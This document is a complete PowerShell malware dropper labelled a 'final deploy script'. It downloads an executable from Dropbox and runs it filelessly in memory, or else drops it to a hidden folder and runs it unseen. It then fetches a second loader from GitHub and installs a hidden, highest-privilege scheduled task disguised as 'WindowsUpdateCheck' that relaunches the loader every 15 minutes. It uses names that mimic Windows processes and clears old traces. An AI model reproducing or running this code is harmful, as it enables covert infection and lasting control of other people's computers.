# ==========================================
# FINAL DEPLOY SCRIPT (C++ LOADER METHOD)
# ==========================================

# --- CONFIGURATION ---
$PayloadUrl = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
$LoaderUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/SearchIndex.exe'
$LoaderPath = "$env:APPDATA\Microsoft\Windows\Templates\SearchIndex.exe"
$TaskName   = "WindowsUpdateCheck"

# --- 1. CLEANUP (Remove Old Traces) ---
try {
    # Remove old registry keys if they exist
    Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    
    # Stop old processes
    Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue
    
    # Remove old tasks if they are broken/wrong
    # We don't unregister if it's already correct, but for safety we can force overwrite later
} catch {}

# --- 2. EXECUTION (Run Payload Now) ---
function Run-Payload {
    Write-Host "Starting Payload..." -F Gray
    try {
        $bytes = (New-Object Net.WebClient).DownloadData($PayloadUrl)
    } catch { return }

    # Attempt 1: Load directly into RAM (Fileless)
    try {
        $assembly = [System.AppDomain]::CurrentDomain.Load($bytes)
        $assembly.EntryPoint.Invoke($null, $null)
        return
    } catch {}

    # Attempt 2: Drop to Disk (Hidden) and Run
    try {
        $path = "$env:APPDATA\Microsoft\Windows\Templates\WmiPrvSE.exe"
        [IO.File]::WriteAllBytes($path, $bytes)
        Start-Process $path -WindowStyle Hidden
    } catch {}
}

# --- 3. PERSISTENCE (Install C++ Loader) ---
try {
    # A. Download the C++ Loader
    try {
        $wc = New-Object Net.WebClient
        $wc.DownloadFile($LoaderUrl, $LoaderPath)
    } catch {
        Write-Host "Loader Download Failed (Using existing if avail)" -F Yellow
    }

    # B. Register the Scheduled Task
    $exists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    
    if ($true) { 
        $Action = New-ScheduledTaskAction -Execute $LoaderPath
        
        # Trigger 1: Run immediately when User Logs on
        $Trigger1 = New-ScheduledTaskTrigger -AtLogon
        
        # Trigger 2: Run Once (Now) -> Repeat every 15 mins -> Indefinitely
        # TRICK: We create a simple trigger first, then manually force the "Indefinitely" duration
        $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
        
        # Principal: Run with Highest Privileges
        $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
        
        # Settings: Hidden, Parallel Execution
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel
        
        # Register the task (This usually defaults to 1 day duration if not specified)
        $Task = Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force
        
        # C. MODIFY THE TASK TO BE TRULY INDEFINITE (The Fix)
        # We edit the raw XML of the task to set Duration to "PT0S" (which means Indefinitely in XML schema)
        $TaskTrigger = $Task.Triggers[1] # Select the second trigger (the repetition one)
        $TaskTrigger.Repetition.Duration = [TimeSpan]::Zero # Zero often maps to "Indefinitely" in PS object model
        $Task | Set-ScheduledTask -ErrorAction SilentlyContinue
        
        Write-Host "✅ C++ Persistence Installed (Zero Flash)." -F Green
    }
} catch {
    Write-Host "⚠️ Persistence Setup Failed: $($_.Exception.Message)" -F Red
}


# --- 4. START ---
Run-Payload

